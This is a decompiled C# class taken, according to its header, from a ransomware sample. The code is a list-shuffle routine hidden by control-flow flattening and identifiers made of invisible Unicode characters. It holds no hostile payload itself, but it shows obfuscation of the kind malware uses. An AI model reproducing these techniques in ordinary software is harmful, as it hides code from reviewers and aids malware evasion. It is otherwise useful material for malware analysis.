// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.ScrambleExtention
// Assembly: StaticIndexRangePartitionForArr, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AF5A1990-133C-4640-B616-63D01D46DEA5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7c7116c6a0f1e06e4c252ea45668b85c1fdf3f35216097be1208e14be4066b36.exe

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public static class ScrambleExtention
  {
    private static readonly Random Random = ScrambleExtention.\u206E‭⁭​‎‌‪⁪⁬⁭‫⁮‪‌⁫⁪‍⁬‪⁬⁮⁭‎‭‭⁪‮⁪‫⁯‬‬⁬‍‪‪‭‍‮‪‮();

    public static void Shuffle<T>(IList<T> list)
    {
label_1:
      int num1 = -1320655790;
      int count;
      bool flag;
      int index;
      T obj;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -371835014)) % 12U)
        {
          case 0:
            index = ScrambleExtention.\u206E⁯‪‍⁭‫‌‍⁭​⁫‮‫‪⁪⁪‫⁮‍⁮​‌​⁫‫‏‌⁬‏‪​‮‏⁪‮⁮‫⁮⁭‬‮(ScrambleExtention.Random, count + 1);
            num1 = (int) num2 * 745122288 ^ -61987900;
            continue;
          case 1:
            num1 = (int) num2 * 1036364889 ^ -2094225728;
            continue;
          case 2:
            list[index] = list[count];
            num1 = (int) num2 * -1071019725 ^ -611918005;
            continue;
          case 3:
            num1 = (int) num2 * 2035963248 ^ -630513241;
            continue;
          case 4:
            goto label_1;
          case 5:
            goto label_3;
          case 6:
            obj = list[index];
            num1 = (int) num2 * 1071319643 ^ 2147439062;
            continue;
          case 7:
            flag = count > 1;
            num1 = -294343336;
            continue;
          case 8:
            count = list.Count;
            num1 = (int) num2 * -1010845112 ^ -1854326907;
            continue;
          case 9:
            --count;
            num1 = -1974125534;
            continue;
          case 10:
            int num3 = flag ? -1406916079 : (num3 = -192481847);
            num1 = num3 ^ (int) num2 * 13930119;
            continue;
          case 11:
            list[count] = obj;
            num1 = (int) num2 * -2093123067 ^ 317057414;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    static int \u206E⁯‪‍⁭‫‌‍⁭​⁫‮‫‪⁪⁪‫⁮‍⁮​‌​⁫‫‏‌⁬‏‪​‮‏⁪‮⁮‫⁮⁭‬‮([In] Random obj0, [In] int obj1) => obj0.Next(obj1);

    static Random \u206E‭⁭​‎‌‪⁪⁬⁭‫⁮‪‌⁫⁪‍⁬‪⁬⁮⁭‎‭‭⁪‮⁪‫⁯‬‬⁬‍‪‪‭‍‮‪‮() => new Random();
  }
}
